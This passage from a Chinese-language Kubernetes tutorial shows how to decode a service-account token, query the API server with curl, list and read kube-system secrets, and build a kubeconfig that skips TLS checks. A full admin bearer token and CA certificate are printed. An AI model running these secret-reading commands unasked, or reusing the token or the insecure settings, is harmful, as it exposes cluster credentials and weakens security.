--decode</span><br>eyJhbGciOiJSUzI1NiIsImtpZCI6Im9IQXYtZkpERlB0V0JHRnFwa2w1czR1Zzhja2lRWTU1cjhpWW1uaEo3cmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycWRzeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjRmZTk1Mzk2LTZkZTgtNDA5Ny05ZmY5LTQyMzJmMDE1MWM3MSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.Xsd8Oo4EYEe3eL4GQweDvnuEfsRoFF0O1RXo_HjACgsj8FMQtU2TdaBhaJk3p7Rvuc_gAz3FqJS9YOWHVlSQKqfL68RCEPfbqb-dXqnKuijFyUKD4NyhnQH42oMf9fWD0NuquhTlNASQSIXdl1WW0u0bY8cOxmQHOOIJvuHMeqLTLG3oQYSgdjdfhHUtrqF1EztORGQKYFoJEv0gZRnXhuUC30MNjVptKPPC8hEzGWaVkcMwTJVIYQ6IYWsoH3o9Z_kDveJpbiOwQO4bV39bfNuefuGZY2SoJTfnyz7ERdT7LZLZ153E14vFbxeaF-_ITD-7cSGqxLZNifv-fmSKzQ<br></code></pre></td></tr></table></figure><p>注意：Linux 和 Mac 有自带的 base64 命令也可以直接使用，输入 base64 是进行编码，Linux 中base64 -d 表示解码，Mac 中使用 base64 -D。</p><h1 id="api访问"><a href="#api访问" class="headerlink" title="api访问"></a>api访问</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># curl https://192.168.56.168:6443/api --header &quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im9IQXYtZkpERlB0V0JHRnFwa2w1czR1Zzhja2lRWTU1cjhpWW1uaEo3cmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycWRzeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjRmZTk1Mzk2LTZkZTgtNDA5Ny05ZmY5LTQyMzJmMDE1MWM3MSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.Xsd8Oo4EYEe3eL4GQweDvnuEfsRoFF0O1RXo_HjACgsj8FMQtU2TdaBhaJk3p7Rvuc_gAz3FqJS9YOWHVlSQKqfL68RCEPfbqb-dXqnKuijFyUKD4NyhnQH42oMf9fWD0NuquhTlNASQSIXdl1WW0u0bY8cOxmQHOOIJvuHMeqLTLG3oQYSgdjdfhHUtrqF1EztORGQKYFoJEv0gZRnXhuUC30MNjVptKPPC8hEzGWaVkcMwTJVIYQ6IYWsoH3o9Z_kDveJpbiOwQO4bV39bfNuefuGZY2SoJTfnyz7ERdT7LZLZ153E14vFbxeaF-_ITD-7cSGqxLZNifv-fmSKzQ&quot; --insecure</span><br>&#123;<br>  <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;APIVersions&quot;</span>,<br>  <span class="hljs-string">&quot;versions&quot;</span>: [<br>    <span class="hljs-string">&quot;v1&quot;</span><br>  ],<br>  <span class="hljs-string">&quot;serverAddressByClientCIDRs&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;clientCIDR&quot;</span>: <span class="hljs-string">&quot;0.0.0.0/0&quot;</span>,<br>      <span class="hljs-string">&quot;serverAddress&quot;</span>: <span class="hljs-string">&quot;192.168.56.168:6443&quot;</span><br>    &#125;<br>  ]<br>&#125;<br><br><br><span class="hljs-comment"># TOKEN=$(kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;|base64 --decode)</span><br><span class="hljs-comment"># APISERVER=https://192.168.56.168:6443</span><br><span class="hljs-comment"># curl -X GET $APISERVER/api --header &quot;Authorization: Bearer $TOKEN&quot; --insecure</span><br>&#123;<br>  <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;APIVersions&quot;</span>,<br>  <span class="hljs-string">&quot;versions&quot;</span>: [<br>    <span class="hljs-string">&quot;v1&quot;</span><br>  ],<br>  <span class="hljs-string">&quot;serverAddressByClientCIDRs&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;clientCIDR&quot;</span>: <span class="hljs-string">&quot;0.0.0.0/0&quot;</span>,<br>      <span class="hljs-string">&quot;serverAddress&quot;</span>: <span class="hljs-string">&quot;192.168.56.168:6443&quot;</span><br>    &#125;<br>  ]<br>&#125;<br><br><br><span class="hljs-comment"># curl -X GET $APISERVER/api/v1/nodes --header &quot;Authorization: Bearer $TOKEN&quot; --insecure </span><br><span class="hljs-comment"># curl -X GET $APISERVER/api/v1/namespaces/default/secrets --header &quot;Authorization: Bearer $TOKEN&quot; --insecure</span><br><span class="hljs-comment"># curl -X GET $APISERVER/api/v1/namespaces/kube-system/secrets --header &quot;Authorization: Bearer $TOKEN&quot; --insecure</span><br><span class="hljs-comment"># curl -X GET $APISERVER/api/v1/namespaces/kube-system/secrets/admin-token-2qdsz --header &quot;Authorization: Bearer $TOKEN&quot; --insecure</span><br>&#123;<br>  <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;Secret&quot;</span>,<br>  <span class="hljs-string">&quot;apiVersion&quot;</span>: <span class="hljs-string">&quot;v1&quot;</span>,<br>  <span class="hljs-string">&quot;metadata&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;admin-token-2qdsz&quot;</span>,<br>    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;kube-system&quot;</span>,<br>    <span class="hljs-string">&quot;selfLink&quot;</span>: <span class="hljs-string">&quot;/api/v1/namespaces/kube-system/secrets/admin-token-2qdsz&quot;</span>,<br>    <span class="hljs-string">&quot;uid&quot;</span>: <span class="hljs-string">&quot;41e80ab2-3840-4cde-bad8-cdad915bbcc9&quot;</span>,<br>    <span class="hljs-string">&quot;resourceVersion&quot;</span>: <span class="hljs-string">&quot;2962635&quot;</span>,<br>    <span class="hljs-string">&quot;creationTimestamp&quot;</span>: <span class="hljs-string">&quot;2022-05-07T03:41:41Z&quot;</span>,<br>    <span class="hljs-string">&quot;annotations&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;kubernetes.io/service-account.name&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>      <span class="hljs-string">&quot;kubernetes.io/service-account.uid&quot;</span>: <span class="hljs-string">&quot;4fe95396-6de8-4097-9ff9-4232f0151c71&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;managedFields&quot;</span>: [<br>      &#123;<br>        <span class="hljs-string">&quot;manager&quot;</span>: <span class="hljs-string">&quot;kube-controller-manager&quot;</span>,<br>        <span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;Update&quot;</span>,<br>        <span class="hljs-string">&quot;apiVersion&quot;</span>: <span class="hljs-string">&quot;v1&quot;</span>,<br>        <span class="hljs-string">&quot;time&quot;</span>: <span class="hljs-string">&quot;2022-05-07T03:41:41Z&quot;</span>,<br>        <span class="hljs-string">&quot;fieldsType&quot;</span>: <span class="hljs-string">&quot;FieldsV1&quot;</span>,<br>        <span class="hljs-string">&quot;fieldsV1&quot;</span>: &#123;<span class="hljs-string">&quot;f:data&quot;</span>:&#123;<span class="hljs-string">&quot;.&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:ca.crt&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:namespace&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:token&quot;</span>:&#123;&#125;&#125;,<span class="hljs-string">&quot;f:metadata&quot;</span>:&#123;<span class="hljs-string">&quot;f:annotations&quot;</span>:&#123;<span class="hljs-string">&quot;.&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:kubernetes.io/service-account.name&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:kubernetes.io/service-account.uid&quot;</span>:&#123;&#125;&#125;&#125;,<span class="hljs-string">&quot;f:type&quot;</span>:&#123;&#125;&#125;<br>      &#125;<br>    ]<br>  &#125;,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;ca.crt&quot;</span>: <span class="hljs-string">&quot;LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR2akNDQXFhZ0F3SUJBZ0lVTVBFY1pDb3graHJPMlJzNk1oblNmTndzV3lJd0RRWUpLb1pJaHZjTkFRRUwKQlFBd1pURUxNQWtHQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFVcHBibWN4RURBT0JnTlZCQWNUQjBKbAphVXBwYm1jeEREQUtCZ05WQkFvVEEyczRjekVQTUEwR0ExVUVDeE1HVTNsemRHVnRNUk13RVFZRFZRUURFd3ByCmRXSmxjbTVsZEdWek1CNFhEVEl4TVRJeE16QXlOVEV3TUZvWERUSTJNVEl4TWpBeU5URXdNRm93WlRFTE1Ba0cKQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFVcHBibWN4RURBT0JnTlZCQWNUQjBKbGFVcHBibWN4RERBSwpCZ05WQkFvVEEyczRjekVQTUEwR0ExVUVDeE1HVTNsemRHVnRNUk13RVFZRFZRUURFd3ByZFdKbGNtNWxkR1Z6Ck1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBeVBsTmJlT2loa1Q0ZHZPVjBxT0QKbnhmSThxQUNFczV3RkZHZUUxamltcFJHZDJ2UVdEWHkwNVdJYVAzNnZrMzlNUGhXTndyVlJlTTQ1SG1VdFZMVApZZVF0TCtqZzJXNUtFVC9ENnBIRmFLalc4VG9CVHdXTUI4dFNSZ0JpTnRKRm5PTUp2Z2tZVDhqdlNTdUhnZjd1ClBvdWFLMUhrUFJYQjFpSi9OSDNQYzMwcTJBV1RmTmNFM21DYU9VMkQrWlBaWUpncGRIV0JCK1pOeHo0R1BCZjcKa2dwbSthQUdydmpzOGZMZFh5MzhhdzNwbitSWGtNNzN5M0w2dDEvbDFvQ0JKcjlQS2pVK0JVa0s1VkdORzFFNAoxQWppQVRUZ3U2S1JKRDV2SGNZeDBHRnJ3dnZDMzRwSCs2Uk1yUWtxZ2RpRlJZVVhEYi9BYjR6RzFlUmRaazArClJRSURBUUFCbzJZd1pEQU9CZ05WSFE4QkFmOEVCQU1DQVFZd0VnWURWUjBUQVFIL0JBZ3dCZ0VCL3dJQkFqQWQKQmdOVkhRNEVGZ1FVY3JvMFdxZ3l1VjJKbTlvbXd6UDlPS25scjN3d0h3WURWUjBqQkJnd0ZvQVVjcm8wV3FneQp1VjJKbTlvbXd6UDlPS25scjN3d0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFKK01HU1BvbHU4VGhkOE1jQTZjCm9EVGdGWTc1MU5RcmlXVXd5a2FBQ2xDZXY2YWp0RU1FdmFDWXZUOXhsaUUrM2lmZDlQTXlPYTB3dDlSUWhLVXIKc01WanVBcUxrWTBhbjhiTm5HeDdkc2IweThBS2JIYXlDQkVBb1ludUtiSXcxUlMvTEpTakJqa1NYS2dsN1c3SwpzNWlzTzBFRFBIS3BOM1lSN3ZiZDdzT2krOTgxTFBWMk4vb2x6TUd3VVNCSUJXTFliZHZveHY2N3JEc1YvZ1lXCjFSZklnOU9USThTVEZhM0RjcHZUNElaTHlIMFhaeisrdjRrK0NZVEptTG9mM0VibWVhQjBya2tNNTZNSFVYWFUKY3pKMi9ETmdhKzNTNU40N0RRYVUvRVlTQXpJWG05a2lYYncwbWZoNnJFcjhHQm9DQzRBWTVOcUJWWUhETjQ1MQpzdG89Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K&quot;</span>,<br>    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;a3ViZS1zeXN0ZW0=&quot;</span>,<br>    <span class="hljs-string">&quot;token&quot;</span>: <span class="hljs-string">&quot;ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltOUlRWFl0WmtwRVJsQjBWMEpIUm5Gd2EydzFjelIxWnpoamEybFJXVFUxY2pocFdXMXVhRW8zY21zaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKaFpHMXBiaTEwYjJ0bGJpMHljV1J6ZWlJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExtNWhiV1VpT2lKaFpHMXBiaUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJalJtWlRrMU16azJMVFprWlRndE5EQTVOeTA1Wm1ZNUxUUXlNekptTURFMU1XTTNNU0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwcmRXSmxMWE41YzNSbGJUcGhaRzFwYmlKOS5Yc2Q4T280RVlFZTNlTDRHUXdlRHZudUVmc1JvRkYwTzFSWG9fSGpBQ2dzajhGTVF0VTJUZGFCaGFKazNwN1J2dWNfZ0F6M0ZxSlM5WU9XSFZsU1FLcWZMNjhSQ0VQZmJxYi1kWHFuS3VpakZ5VUtENE55aG5RSDQyb01mOWZXRDBOdXF1aFRsTkFTUVNJWGRsMVdXMHUwYlk4Y094bVFIT09JSnZ1SE1lcUxUTEczb1FZU2dkamRmaEhVdHJxRjFFenRPUkdRS1lGb0pFdjBnWlJuWGh1VUMzME1OalZwdEtQUEM4aEV6R1dhVmtjTXdUSlZJWVE2SVlXc29IM285Wl9rRHZlSnBiaU93UU80YlYzOWJmTnVlZnVHWlkyU29KVGZueXo3RVJkVDdMWkxaMTUzRTE0dkZieGVhRi1fSVRELTdjU0dxeExaTmlmdi1mbVNLelE=&quot;</span>   <span class="hljs-comment"># base64编码后的</span><br>  &#125;,<br>  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;kubernetes.io/service-account-token&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="kubeconfig-token"><a href="#kubeconfig-token" class="headerlink" title="kubeconfig (token)"></a>kubeconfig (token)</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiVersion: v1<br>clusters:<br>- cluster:<br>    insecure-skip-tls-verify: <span class="hljs-literal">true</span><br>    server: https://192.168.56.168:6443<br>  name: kubernetes<br>contexts:<br>- context:<br>    cluster: kubernetes<br>    user: system:admin<br>  name: system:admin<br>current-context: system:admin<br>kind: Config<br>preferences: &#123;&#125;<br><span class="hljs-built_in">users</span>:<br>- name: system:admin<br>  user:<br>    token: eyJhbGciOiJSUzI1NiIsImtpZCI6Im9IQXYtZkpERlB0V0JHRnFwa2w1czR1Zzhja2lRWTU1cjhpWW1uaEo3cmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycWRzeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjRmZTk1Mzk2LTZkZTgtNDA5Ny05ZmY5LTQyMzJmMDE1MWM3MSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.Xsd8Oo4EYEe3eL4GQweDvnuEfsRoFF0O1RXo_HjACgsj8FMQtU2TdaBhaJk3p7Rvuc_gAz3FqJS9YOWHVlSQKqfL68RCEPfbqb-dXqnKuijFyUKD4NyhnQH42oMf9fWD0NuquhTlNASQSIXdl1WW0u0bY8cOxmQHOOIJvuHMeqLTLG3oQYSgdjdfhHUtrqF1EztORGQKYFoJEv0gZRnXhuUC30MNjVptKPPC8hEzGWaVkcMwTJVIYQ6IYWsoH3o9Z_kDveJpbiOwQO4bV39bfNuefuGZY2SoJTfnyz7ERdT7LZLZ153E14vFbxeaF-_ITD-7cSGqxLZNifv-fmSKzQ<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kubectl --kubeconfig kubeconfig-168-token get secret -A 可用</span><br><span class="hljs-comment"># kubectl --kubeconfig kubeconfig-168-token get pod -A    可用</span><br></code></pre></td></tr></table></figure><h1 id="总结：token编解码"><a href="#总结：token编解码" class="headerlink" title="总结：token编解码"></a>总结：token编解码</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 注意：token是base64解码后的值</span><br><span class="hljs-comment"># kubectl -n kube-system describe secret admin-token-2qdsz</span><br>Name:         admin-token-2qdsz<br>Namespace:    kube-system<br>Labels:       &lt;none&gt;<br>Annotations:  kubernetes.io/service-account.name: admin<br>              kubernetes.io/service-account.uid: 4fe95396-6de8-4097-9ff9-4232f0151c71<br><br>Type:  kubernetes.io/service-account-token<br><br>Data<br>====<br>ca.crt:     1359 bytes<br>namespace:  11 bytes<br>token:      eyJhbGciOiJSUzI1NiIsImtpZCI6Im9IQXYtZkpERlB0V0JHRnFwa2w1czR1Zzhja2lRWTU1cjhpWW1uaEo3cmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycWRzeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjRmZTk1Mzk2LTZkZTgtNDA5Ny05ZmY5LTQyMzJmMDE1MWM3MSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.Xsd8Oo4EYEe3eL4GQweDvnuEfsRoFF0O1RXo_HjACgsj8FMQtU2TdaBhaJk3p7Rvuc_gAz3FqJS9YOWHVlSQKqfL68RCEPfbqb-dXqnKuijFyUKD4NyhnQH42oMf9fWD0NuquhTlNASQSIXdl1WW0u0bY8cOxmQHOOIJvuHMeqLTLG3oQYSgdjdfhHUtrqF1EztORGQKYFoJEv0gZRnXhuUC30MNjVptKPPC8hEzGWaVkcMwTJVIYQ6IYWsoH3o9Z_kDveJpbiOwQO4bV39bfNuefuGZY2SoJTfnyz7ERdT7LZLZ153E14vFbxeaF-_ITD-7cSGqxLZNifv-fmSKzQ   <br><br><br><br><br><span class="hljs-comment"># 注意：token是base64解码后的值</span><br><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;|base64 -d</span><br><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;|base64 --decode</span><br>eyJhbGciOiJSUzI1NiIsImtpZCI6Im9IQXYtZkpERlB0V0JHRnFwa2w1czR1Zzhja2lRWTU1cjhpWW1uaEo3cmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycWRzeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjRmZTk1Mzk2LTZkZTgtNDA5Ny05ZmY5LTQyMzJmMDE1MWM3MSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.Xsd8Oo4EYEe3eL4GQweDvnuEfsRoFF0O1RXo_HjACgsj8FMQtU2TdaBhaJk3p7Rvuc_gAz3FqJS9YOWHVlSQKqfL68RCEPfbqb-dXqnKuijFyUKD4NyhnQH42oMf9fWD0NuquhTlNASQSIXdl1WW0u0bY8cOxmQHOOIJvuHMeqLTLG3oQYSgdjdfhHUtrqF1EztORGQKYFoJEv0gZRnXhuUC30MNjVptKPPC8hEzGWaVkcMwTJVIYQ6IYWsoH3o9Z_kDveJpbiOwQO4bV39bfNuefuGZY2SoJTfnyz7ERdT7LZLZ153E14vFbxeaF-_ITD-7cSGqxLZNifv-fmSKzQ<br><br><br><br><br><span class="hljs-comment"># 注意：token是base64编码后的值</span><br><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;</span><br>ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltOUlRWFl0WmtwRVJsQjBWMEpIUm5Gd2EydzFjelIxWnpoamEybFJXVFUxY2pocFdXMXVhRW8zY21zaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKaFpHMXBiaTEwYjJ0bGJpMHljV1J6ZWlJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExtNWhiV1VpT2lKaFpHMXBiaUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJalJtWlRrMU16azJMVFprWlRndE5EQTVOeTA1Wm1ZNUxUUXlNekptTURFMU1XTTNNU0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwcmRXSmxMWE41YzNSbGJUcGhaRzFwYmlKOS5Yc2Q4T280RVlFZTNlTDRHUXdlRHZudUVmc1JvRkYwTzFSWG9fSGpBQ2dzajhGTVF0VTJUZGFCaGFKazNwN1J2dWNfZ0F6M0ZxSlM5WU9XSFZsU1FLcWZMNjhSQ0VQZmJxYi1kWHFuS3VpakZ5VUtENE55aG5RSDQyb01mOWZXRDBOdXF1aFRsTkFTUVNJWGRsMVdXMHUwYlk4Y094bVFIT09JSnZ1SE1lcUxUTEczb1FZU2dkamRmaEhVdHJxRjFFenRPUkdRS1lGb0pFdjBnWlJuWGh1VUMzME1OalZwdEtQUEM4aEV6R1dhVmtjTXdUSlZJWVE2SVlXc29IM285Wl9rRHZlSnBiaU93UU80YlYzOWJmTnVlZnVHWlkyU29KVGZueXo3RVJkVDdMWkxaMTUzRTE0dkZieGVhRi1fSVRELTdjU0dxeExaTmlmdi1mbVNLelE=<br><br><span class="hljs-comment"># 注意：token是base64编码后的值</span><br><span class="hljs-comment"># curl -X GET $APISERVER/api/v1/namespaces/kube-system/secrets/admin-token-2qdsz --header &quot;Authorization: Bearer $TOKEN&quot; --insecure</span><br>&#123;<br>  <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;Secret&quot;</span>,<br>  <span class="hljs-string">&quot;apiVersion&quot;</span>: <span class="hljs-string">&quot;v1&quot;</span>,<br>  <span class="hljs-string">&quot;metadata&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;admin-token-2qdsz&quot;</span>,<br>    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;kube-system&quot;</span>,<br>    <span class="hljs-string">&quot;selfLink&quot;</span>: <span class="hljs-string">&quot;/api/v1/namespaces/kube-system/secrets/admin-token-2qdsz&quot;</span>,<br>    <span class="hljs-string">&quot;uid&quot;</span>: <span class="hljs-string">&quot;41e80ab2-3840-4cde-bad8-cdad915bbcc9&quot;</span>,<br>    <span class="hljs-string">&quot;resourceVersion&quot;</span>: 